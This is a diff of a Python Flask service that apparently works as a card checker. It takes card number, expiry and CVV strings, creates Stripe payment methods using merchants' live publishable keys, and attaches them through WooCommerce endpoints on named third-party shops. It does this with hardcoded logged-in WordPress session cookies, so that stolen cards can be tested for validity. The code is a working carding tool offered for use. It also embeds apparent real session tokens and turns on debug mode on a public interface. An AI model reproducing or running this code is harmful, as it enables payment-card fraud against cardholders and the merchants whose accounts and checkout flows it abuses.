@@ -4,245 +4,179 @@ import re
 
 app = Flask(__name__)
 
-def validate_credit_card(card_data):
-    """
-    Validate credit card data format
-    Expected format: card_no|mm|yy|cvv
-    """
-    if not card_data:
-        return False, "No card data provided"
-    
-    parts = card_data.split('|')
-    if len(parts) != 4:
-        return False, "Invalid format. Use: card_no|mm|yy|cvv"
-    
-    card_no, mm, yy, cvv = parts
-    
-    # Validate card number (basic check)
-    if not re.match(r'^\d{13,19}$', card_no):
-        return False, "Invalid card number"
-    
-    # Validate month
-    if not re.match(r'^\d{1,2}$', mm) or not (1 <= int(mm) <= 12):
-        return False, "Invalid month (01-12)"
-    
-    # Validate year (accept both yy and yyyy)
-    if not re.match(r'^\d{2,4}$', yy):
-        return False, "Invalid year"
-    
-    # Convert year to 2-digit format if needed
-    if len(yy) == 4:
-        yy = yy[2:]
-    
-    # Validate CVV
-    if not re.match(r'^\d{3,4}$', cvv):
-        return False, "Invalid CVV"
-    
-    return True, {
-        'card_no': card_no,
-        'mm': mm.zfill(2),  # Ensure 2-digit month
-        'yy': yy,
-        'cvv': cvv
-    }
+# ========== CONFIGURATION ==========
+COOKIES = {
+    'wordpress_sec_6a3ae81458afebc3533a2a615b353027': 'kinbbgbossagain%7C1776539591%7CughQ2lODZ2Y5LJLGE90exV5EJUNAazPZZhCDgpNTAfe%7Cc66915f585b0735b582dd6d4cb9c72a865e30f3d6605301a9e9e8550cb4771f5',
+    'wordpress_logged_in_6a3ae81458afebc3533a2a615b353027': 'kinbbgbossagain%7C1776539591%7CughQ2lODZ2Y5LJLGE90exV5EJUNAazPZZhCDgpNTAfe%7C5a8047ffb8c45d6347731b2ced7afdcc7035bd41c7447849a8a9dffd916f530c',
+    '__stripe_mid': '11e2b34c-c4f8-4517-b9f4-6be30a7ca77f76f71c',
+    '__stripe_sid': '89890448-7b04-4ed2-9aaf-2a06a800ceb1e18908',
+    '_ga': 'GA1.2.1802109903.1775329974',
+    '_gid': 'GA1.2.1646680589.1775329976',
+    '_ga_S2XYXYZPYM': 'GS2.1.s1775329973$o1$g1$t1775330049$j49$l0$h0',
+    '_ga_SJLJH2CX6D': 'GS2.1.s1775329975$o1$g1$t1775330050$j52$l0$h0',
+    '_gcl_au': '1.1.1001738291.1775329975.813022909.1775329986.1775330050',
+    '__kla_id': 'eyJjaWQiOiJNbVprT0dKa05XVXRaRE13T1MwME1qUXlMVGxsTVdZdE1XWXlPR0l4WVdRMk1UWTQiLCIkZXhjaGFuZ2VfaWQiOiJ5RlItRkJkbm9Fby1qSk5yNkZHRXE5V1NvWG1BbDQ3NDNfZS13TWttaFFXTlktY2ZfRVlnR2ZlNFF5OFkzOU1VLlNMSFRnSiJ9',
+    'sbjs_migrations': '1418474375998%3D1',
+    'sbjs_current_add': 'fd%3D2026-04-04%2019%3A42%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.strymon.net%2F%7C%7C%7Crf%3D%28none%29',
+    'sbjs_first_add': 'fd%3D2026-04-04%2019%3A42%3A52%7C%7C%7Cep%3Dhttps%3A%2F%2Fwww.strymon.net%2F%7C%7C%7Crf%3D%28none%29',
+    'sbjs_current': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+    'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Cplt%3D%28none%29%7C%7C%7Cfmt%3D%28none%29%7C%7C%7Ctct%3D%28none%29',
+    'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F127.0.0.0%20Mobile%20Safari%2F537.36',
+    'sbjs_session': 'pgs%3D7%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fwww.strymon.net%2Fmy-account%2Fpayment-methods%2F',
+}
 
-def get_stripe_headers_and_data(site, cc_data):
-    """
-    Return appropriate Stripe headers and data based on the site
-    """
-    base_headers = {
-        'authority': 'api.stripe.com',
-        'accept': 'application/json',
-        'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-        'content-type': 'application/x-www-form-urlencoded',
-        'origin': 'https://js.stripe.com',
-        'referer': 'https://js.stripe.com/',
-        'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-        'sec-ch-ua-mobile': '?1',
-        'sec-ch-ua-platform': '"Android"',
-        'sec-fetch-dest': 'empty',
-        'sec-fetch-mode': 'cors',
-        'sec-fetch-site': 'same-site',
-        'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-    }
+HEADERS_PAGE = {
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
+    'accept-language': 'en-US',
+    'referer': 'https://www.strymon.net/my-account/payment-methods/',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
+}
 
-    # Default configuration (for shop.wiseacrebrew.com)
-    if site == 'shop.wiseacrebrew.com':
-        data = f'type=card&card[number]={cc_data["card_no"]}&card[cvc]={cc_data["cvv"]}&card[exp_year]={cc_data["yy"]}&card[exp_month]={cc_data["mm"]}&allow_redisplay=unspecified&billing_details[address][country]=IN&payment_user_agent=stripe.js%2F7ab2721f84%3B+stripe-js-v3%2F7ab2721f84%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fshop.wiseacrebrew.com&time_on_page=277623&client_attribution_metadata[client_session_id]=63b40a11-d53d-4b60-af73-bf1f472c55ce&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_config_id]=885aa08a-48ed-453e-928e-92fab222bb47&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&client_attribution_metadata[merchant_integration_additional_elements][1]=achBankSearchResults&guid=34461288-8dd1-47ee-ae6e-385ae0f1e4d5595130&muid=810cf478-762b-4d16-a93b-12120ff987f883bbe6&sid=73f92f0a-e14b-432b-8799-9e8cb89297f886157f&key=pk_live_51Aa37vFDZqj3DJe6y08igZZ0Yu7eC5FPgGbh99Zhr7EpUkzc3QIlKMxH8ALkNdGCifqNy6MJQKdOcJz3x42XyMYK00mDeQgBuy&_stripe_version=2024-06-20'
+HEADERS_STRIPE = {
+    'accept': 'application/json',
+    'accept-language': 'en-US',
+    'content-type': 'application/x-www-form-urlencoded',
+    'origin': 'https://js.stripe.com',
+    'referer': 'https://js.stripe.com/',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
+}
+
+HEADERS_AJAX = {
+    'accept': '*/*',
+    'accept-language': 'en-US',
+    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
+    'origin': 'https://www.strymon.net',
+    'referer': 'https://www.strymon.net/my-account/add-payment-method/',
+    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Mobile Safari/537.36',
+    'x-requested-with': 'XMLHttpRequest',
+}
+
+def parse_card_details(card_string):
+    """Parse card string in format: CC|MM|YY|CVV or CC|MM|YY or CC|MM|YY|CVV"""
+    parts = card_string.split('|')
+    
+    if len(parts) >= 3:
+        card_number = parts[0].replace(' ', '').replace('-', '')
+        exp_month = parts[1].zfill(2)
+        exp_year = parts[2]
         
-        site_cookies = {
-            '_ga': 'GA1.1.1677572053.1762021267',
-            'sbjs_migrations': '1418474375998%3D1',
-            'sbjs_current_add': 'fd%3D2025-11-01%2017%3A51%3A08%7C%7C%7Cep%3Dhttps%3A%2F%2Fshop.wiseacrebrew.com%2F%7C%7C%7Crf%3D%28none%29',
-            'sbjs_first_add': 'fd%3D2025-11-01%2017%3A51%3A08%7C%7C%7Cep%3Dhttps%3A%2F%2Fshop.wiseacrebrew.com%2F%7C%7C%7Crf%3D%28none%29',
-            'sbjs_first': 'typ%3Dtypein%7C%7C%7Csrc%3D%28direct%29%7C%7C%7Cmdm%3D%28none%29%7C%7C%7Ccmp%3D%28none%29%7C%7C%7Ccnt%3D%28none%29%7C%7C%7Cid%3D%28none%29%7C%7C%7Ctrm%3D%28none%29%7C%7C%7Cmtke%3D%28none%29',
-            'mtk_src_trk': '%7B%22type%22%3A%22typein%22%2C%22url%22%3A%22(none)%22%2C%22mtke%22%3A%22(none)%22%2C%22utm_campaign%22%3A%22(none)%22%2C%22utm_source%22%3A%22(direct)%22%2C%22utm_medium%22%3A%22(none)%22%2C%22utm_content%22%3A%22(none)%22%2C%22utm_id%22%3A%22(none)%22%2C%22utm_term%22%3A%22(none)%22%2C%22session_entry%22%3A%22https%3A%2F%2Fshop.wiseacrebrew.com%2F%22%2C%22session_start_time%22%3A%222025-11-01%2017%3A51%3A08%22%2C%22session_pages%22%3A%221%22%2C%22session_count%22%3A%221%22%7D',
-            'wordpress_sec_dedd3d5021a06b0ff73c12d14c2f177c': 'wizardlyaura999%7C1763230916%7CA4Tikd7dZ2HEZqI368RbvldTzpL8i52015Q36nWQG85%7C19bc61f5ee9046838995c6c842b6ff65c5a93d5cd66ad27045c4fbbb1b919efe',
-            'wordpress_logged_in_dedd3d5021a06b0ff73c12d14c2f177c': 'wizardlyaura999%7C1763230916%7CA4Tikd7dZ2HEZqI368RbvldTzpL8i52015Q36nWQG85%7C4814b16d264498b11235fd8fe79fe4c4a5cf21b92ce389e6c62686a834032c08',
-            'sbjs_udata': 'vst%3D1%7C%7C%7Cuip%3D%28none%29%7C%7C%7Cuag%3DMozilla%2F5.0%20%28Linux%3B%20Android%2010%3B%20K%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F139.0.0.0%20Mobile%20Safari%2F537.36',
-            'sbjs_current': '%C2%9E%C3%A9e',
-            '__stripe_mid': '810cf478-762b-4d16-a93b-12120ff987f883bbe6',
-            '__stripe_sid': '73f92f0a-e14b-432b-8799-9e8cb89297f886157f',
-            'sbjs_session': 'pgs%3D11%7C%7C%7Ccpg%3Dhttps%3A%2F%2Fshop.wiseacrebrew.com%2Faccount%2Fadd-payment-method%2F',
-            '_ga_94LZDRFSLM': 'GS2.1.s1762021267$o1$g1$t1762021431$j24$l0$h0',
+        # Handle 2-digit year (26 -> 2026, but Stripe needs 26 or 2026?)
+        if len(exp_year) == 2:
+            exp_year = exp_year
+        
+        cvv = parts[3] if len(parts) >= 4 else '123'
+        
+        return {
+            'number': card_number,
+            'exp_month': exp_month,
+            'exp_year': exp_year,
+            'cvv': cvv
         }
-
-        site_headers = {
-            'authority': 'shop.wiseacrebrew.com',
-            'accept': '*/*',
-            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
-            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
-            'origin': 'https://shop.wiseacrebrew.com',
-            'referer': 'https://shop.wiseacrebrew.com/account/add-payment-method/',
-            'sec-ch-ua': '"Chromium";v="139", "Not;A=Brand";v="99"',
-            'sec-ch-ua-mobile': '?1',
-            'sec-ch-ua-platform': '"Android"',
-            'sec-fetch-dest': 'empty',
-            'sec-fetch-mode': 'cors',
-            'sec-fetch-site': 'same-origin',
-            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/139.0.0.0 Mobile Safari/537.36',
-            'x-requested-with': 'XMLHttpRequest',
-        }
-
-        site_data = {
-            'action': 'wc_stripe_create_and_confirm_setup_intent',
-            'wc-stripe-payment-method': '{payment_method_id}',
-            'wc-stripe-payment-type': 'card',
-            '_ajax_nonce': '3a28ca36fe',
-        }
-
-        endpoint = 'https://shop.wiseacrebrew.com/wp/wp-admin/admin-ajax.php'
-
-    # Add more site configurations here as needed
-    # elif site == 'another-site.com':
-    #     data = '...'
-    #     site_cookies = {...}
-    #     site_headers = {...}
-    #     site_data = {...}
-    #     endpoint = '...'
-
     else:
-        # Default configuration for unknown sites
-        data = f'type=card&card[number]={cc_data["card_no"]}&card[cvc]={cc_data["cvv"]}&card[exp_year]={cc_data["yy"]}&card[exp_month]={cc_data["mm"]}&allow_redisplay=unspecified&billing_details[address][country]=US&payment_user_agent=stripe.js%2F234f261dc5%3B+stripe-js-v3%2F234f261dc5%3B+payment-element%3B+deferred-intent%3B+autopm&referrer=https%3A%2F%2F{site}&time_on_page=34017&key=pk_live_51Kg8dtBXnyl1N5QY5UDJKCtBpYRB0SiGjpzJdN2sdcy3BxgAQRFtRxQEbm3lBmHQBzUWb3gz9bcVrkcMAVJ2xwav00P1HQeJHz&_stripe_version=2024-06-20'
-        
-        site_cookies = {}
-        site_headers = {}
-        site_data = {}
-        endpoint = f'https://{site}/wp-admin/admin-ajax.php'
+        return None
 
-    return base_headers, data, site_cookies, site_headers, site_data, endpoint
+def get_nonces():
+    """Extract both nonces from the page"""
+    response = requests.get('https://www.strymon.net/my-account/add-payment-method/', 
+                           cookies=COOKIES, 
+                           headers=HEADERS_PAGE)
+    
+    if response.status_code != 200:
+        return None, None
+    
+    checkout_nonce_match = re.search(r'"createCheckoutSessionNonce":"([^"]+)"', response.text)
+    ajax_nonce_match = re.search(r'"createAndConfirmSetupIntentNonce":"([^"]+)"', response.text)
+    
+    checkout_nonce = checkout_nonce_match.group(1) if checkout_nonce_match else None
+    ajax_nonce = ajax_nonce_match.group(1) if ajax_nonce_match else None
+    
+    return checkout_nonce, ajax_nonce
 
-@app.route('/gateway=stripeauth/site=<path:site>/cc=<path:card_data>', methods=['GET'])
-def process_payment(site, card_data):
-    """
-    Process Stripe payment with provided site and credit card data
-    Format: /gateway=stripeauth/site=example.com/cc=card_no|mm|yy|cvv
-    """
-    try:
-        # Validate card data
-        is_valid, validation_result = validate_credit_card(card_data)
-        
-        if not is_valid:
-            return jsonify({
-                'status': 'error',
-                'message': validation_result,
-                'site': site
-            }), 400
-        
-        cc_data = validation_result
-        
-        # Get appropriate configuration for the site
-        stripe_headers, stripe_data, site_cookies, site_headers, site_form_data, endpoint = get_stripe_headers_and_data(site, cc_data)
+def create_stripe_payment_method(card_details):
+    """Create payment method in Stripe"""
+    stripe_data = f'type=card&card[number]={card_details["number"]}&card[cvc]={card_details["cvv"]}&card[exp_year]={card_details["exp_year"]}&card[exp_month]={card_details["exp_month"]}&allow_redisplay=unspecified&billing_details[address][postal_code]=10080&billing_details[address][country]=US&payment_user_agent=stripe.js%2F6f8494a281%3B+stripe-js-v3%2F6f8494a281%3B+payment-element%3B+deferred-intent&referrer=https%3A%2F%2Fwww.strymon.net&time_on_page=42341&client_attribution_metadata[client_session_id]=c4ebef05-119f-4e09-9180-e99f75dff3ff&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=payment-element&client_attribution_metadata[merchant_integration_version]=2021&client_attribution_metadata[payment_intent_creation_flow]=deferred&client_attribution_metadata[payment_method_selection_flow]=merchant_specified&client_attribution_metadata[elements_session_id]=elements_session_1ETKAW8GsA1&client_attribution_metadata[elements_session_config_id]=3f36629e-3a79-4323-bca5-06c46b3daefb&client_attribution_metadata[merchant_integration_additional_elements][0]=payment&guid=96cf39f6-3cee-4008-ba82-c50e9f1d144060102f&muid=11e2b34c-c4f8-4517-b9f4-6be30a7ca77f76f71c&sid=89890448-7b04-4ed2-9aaf-2a06a800ceb1e18908&key=pk_live_51KgGVGAoMZ1qjkrWI1y0fQ2e4xAwNwDMuTVGeF9TA4GSTqGZCnJhZJxUeBFXW8hzUI6UiRqKKpNUZyMUMjwkYjGg00rdwxmApR&_stripe_version=2025-09-30.clover'
+    
+    response = requests.post('https://api.stripe.com/v1/payment_methods', 
+                            headers=HEADERS_STRIPE, 
+                            data=stripe_data)
+    
+    if response.status_code == 200:
+        return response.json().get('id')
+    return None
 
-        # Step 1: Create payment method with Stripe
-        response = requests.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data)
-        
-        if response.status_code != 200:
-            return jsonify({
-                'status': 'error',
-                'message': f'Stripe API error: {response.status_code}',
-                'response': response.text,
-                'site': site
-            }), 400
-        
-        op = response.json()
-        
-        if 'id' not in op:
-            return jsonify({
-                'status': 'error',
-                'message': 'Failed to create payment method',
-                'response': op,
-                'site': site
-            }), 400
-            
-        payment_method_id = op["id"]
+def attach_payment_method(payment_method_id, ajax_nonce):
+    """Attach payment method to WordPress account"""
+    ajax_data = {
+        'action': 'wc_stripe_create_and_confirm_setup_intent',
+        'wc-stripe-payment-method': payment_method_id,
+        'wc-stripe-payment-type': 'card',
+        '_ajax_nonce': ajax_nonce,
+    }
+    
+    response = requests.post('https://www.strymon.net/wp-admin/admin-ajax.php',
+                            cookies=COOKIES,
+                            headers=HEADERS_AJAX,
+                            data=ajax_data)
+    
+    return response.json()
 
-        # Step 2: Process payment with the created payment method
-        if site_form_data:
-            # Update the payment method ID in the form data
-            site_form_data['wc-stripe-payment-method'] = payment_method_id
-            
-            response = requests.post(
-                endpoint, 
-                cookies=site_cookies, 
-                headers=site_headers, 
-                data=site_form_data
-            )
-
-            return jsonify({
-                'status': 'success',
-                'site': site,
-                'payment_method_id': payment_method_id,
-                'response': response.text,
-                'status_code': response.status_code
-            })
-        else:
-            return jsonify({
-                'status': 'error',
-                'message': f'No configuration found for site: {site}',
-                'site': site,
-                'payment_method_id': payment_method_id
-            }), 400
-
-    except Exception as e:
+@app.route('/stauth', methods=['GET', 'POST'])
+def stauth():
+    """Main API endpoint"""
+    # Get card details from query parameter or form data
+    if request.method == 'GET':
+        card_param = request.args.get('cc')
+    else:
+        card_param = request.form.get('cc')
+    
+    if not card_param:
         return jsonify({
-            'status': 'error',
-            'message': f'Internal server error: {str(e)}',
-            'site': site
+            'success': False,
+            'error': 'Missing card parameter. Use format: ?cc=CC|MM|YY|CVV'
+        }), 400
+    
+    # Parse card details
+    card_details = parse_card_details(card_param)
+    if not card_details:
+        return jsonify({
+            'success': False,
+            'error': 'Invalid card format. Use: CC|MM|YY|CVV (e.g., 4400430268343784|02|26|232)'
+        }), 400
+    
+    # Get nonces
+    checkout_nonce, ajax_nonce = get_nonces()
+    if not ajax_nonce:
+        return jsonify({
+            'success': False,
+            'error': 'Failed to fetch nonces. Session may be expired.'
         }), 500
+    
+    # Create payment method in Stripe
+    payment_method_id = create_stripe_payment_method(card_details)
+    if not payment_method_id:
+        return jsonify({
+            'success': False,
+            'error': 'Failed to create payment method in Stripe. Card may be invalid.'
+        }), 400
+    
+    # Attach to WordPress
+    result = attach_payment_method(payment_method_id, ajax_nonce)
+    
+    # Return response exactly as received from WordPress
+    return jsonify({
+        'success': result.get('success', False),
+        'payment_method_id': payment_method_id,
+        'response': result,
+        'card_details': {
+            'last4': card_details['number'][-4:],
+            'expiry': f"{card_details['exp_month']}/{card_details['exp_year']}"
+        }
+    })
 
 @app.route('/health', methods=['GET'])
-def health_check():
-    """Health check endpoint for Render"""
-    return jsonify({'status': 'healthy', 'message': 'Server is running'})
-
-@app.route('/sites', methods=['GET'])
-def supported_sites():
-    """List supported sites"""
-    return jsonify({
-        'supported_sites': [
-            'shop.wiseacrebrew.com',
-            # Add more sites as you configure them
-        ],
-        'usage': 'GET /gateway=stripeauth/site=example.com/cc=card_no|mm|yy|cvv'
-    })
-
-@app.route('/', methods=['GET'])
-def home():
-    """Home endpoint with usage instructions"""
-    return jsonify({
-        'message': 'Stripe Payment Processor API with Dynamic Site Support',
-        'usage': 'GET /gateway=stripeauth/site=example.com/cc=card_no|mm|yy|cvv',
-        'example': '/gateway=stripeauth/site=shop.wiseacrebrew.com/cc=5392582546656184|08|26|416',
-        'supported_formats': [
-            'card_no|mm|yy|cvv',
-            'card_no|mm|yyyy|cvv'
-        ],
-        'endpoints': {
-            '/health': 'Health check',
-            '/sites': 'List supported sites',
-            '/gateway=stripeauth/site={site}/cc={card_data}': 'Process payment'
-        }
-    })
+def health():
+    """Health check endpoint"""
+    return jsonify({'status': 'ok'})
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000, debug=False)
+    app.run(host='0.0.0.0', port=5000, debug=True)
